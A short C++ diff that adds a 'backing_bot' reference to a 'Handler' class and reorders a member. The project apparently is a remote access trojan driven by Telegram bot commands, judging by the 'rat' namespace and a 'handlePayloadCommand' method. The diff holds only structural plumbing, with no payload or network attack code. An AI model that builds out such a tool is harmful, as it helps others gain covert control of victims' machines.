@@ -18,8 +18,9 @@ private:
 
     //the handler refrences the bot instead of owning it, they bot live inside the scope of the void botLoop(void) functions;
     tbot::Bot& bot;
-    RatState state;
+    tbot::BaseBot& backing_bot;
     
+    RatState state;
     rat::networking::Client curl_client;
 
     rat::tbot::Update telegram_update;
@@ -84,8 +85,9 @@ private:
     void handlePayloadCommand(void);
     
 public:
-    Handler(rat::tbot::Bot& arg_Bot):
+    Handler(rat::tbot::Bot& arg_Bot, rat::tbot::BaseBot& Backing_Bot):
         bot(arg_Bot),
+        backing_bot(Backing_Bot),
         state(),
         curl_client(),
         telegram_update(),
